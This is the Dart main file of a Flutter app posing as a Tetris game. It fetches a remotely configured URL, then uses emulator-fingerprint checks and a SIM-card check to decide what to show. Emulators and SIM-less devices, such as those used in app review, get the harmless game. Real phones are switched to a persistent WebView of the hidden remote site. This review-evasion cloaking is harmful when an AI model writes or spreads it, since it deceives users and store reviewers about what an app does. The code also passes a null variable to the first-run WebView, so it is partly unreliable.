import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_unity_widget_example/screens/message_screen.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'package:firebase_core/firebase_core.dart';
import 'firebase_options.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter_unity_widget_example/screens/web_view.dart';
import 'package:mobile_number/mobile_number.dart';
import 'package:flutter_unity_widget_example/tetris.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  final prefs = await SharedPreferences.getInstance();
  final prefsUrl = await prefs.getString("url");

  if (prefsUrl != null && prefsUrl != "") {
    bool result = await InternetConnectionChecker().hasConnection;
    if (result == true) {
      runApp(WebViewWidget(serverAdress: prefsUrl));
    } else {
      runApp(
          MessageScreen(msg: "Для продолжения необходимо подключение к сети"));
    }

    return;
  }
  try {
    await Firebase.initializeApp(
      options: DefaultFirebaseOptions.currentPlatform,
    );

    final remoteConfig = FirebaseRemoteConfig.instance;
    remoteConfig.setConfigSettings(RemoteConfigSettings(
      fetchTimeout: const Duration(minutes: 1),
      minimumFetchInterval: const Duration(hours: 1),
    ));

    remoteConfig.setDefaults(const {
      "url": "",
    });

    final activateResult = await remoteConfig.fetchAndActivate();
    String url = remoteConfig.getString('url');
    final iEmulator = await checkIsEmu();

    bool isNoSim = false;

    if (await Permission.phone.request().isGranted) {
      isNoSim = await checkIsNoSim();
    } else {
      isNoSim = true;
    }

    if (url == null || url == "" || iEmulator == true || isNoSim == true) {
      runApp(
        MaterialApp(
          debugShowCheckedModeBanner: false,
          home: Tetris(),
        ),
      );
    } else {
      await prefs.setString("url", url);
      runApp(WebViewWidget(serverAdress: prefsUrl));
    }
  } catch (exception) {
    runApp(MessageScreen(msg: exception.toString()));
  }
}

checkIsEmu() async {
  final devinfo = DeviceInfoPlugin();
  final em = await devinfo.androidInfo;
  var phoneModel = em.model;
  var buildProduct = em.product;
  var buildHardware = em.hardware;
  var result = (em.fingerprint.startsWith("generic") ||
      phoneModel.contains("google_sdk") ||
      phoneModel.contains("droid4x") ||
      phoneModel.contains("Emulator") ||
      phoneModel.contains("Android SDK built for x86") ||
      em.manufacturer.contains("Genymotion") ||
      buildHardware == "goldfish" ||
      buildHardware == "vbox86" ||
      buildProduct == "sdk" ||
      buildProduct == "google_sdk" ||
      buildProduct == "sdk_x86" ||
      buildProduct == "vbox86p" ||
      em.board.toLowerCase().contains("nox") ||
      em.bootloader.toLowerCase().contains("nox") ||
      buildHardware.toLowerCase().contains("nox") ||
      buildProduct.toLowerCase().contains("nox"));
  if (result && !em.isPhysicalDevice) return true;
  result = result ||
      (em.brand.startsWith("generic") && em.device.startsWith("generic"));
  if (result && !em.isPhysicalDevice) return true;
  result = result || ("google_sdk" == buildProduct);
  return result && !em.isPhysicalDevice;
}

checkIsNoSim() async {
  List<SimCard> _simCard = <SimCard>[];
  try {
    _simCard = (await MobileNumber.getSimCards);
  } on PlatformException catch (e) {
    print("Failed to get mobile number because of '${e.message}'");
  }
  return _simCard.length <= 0;
}
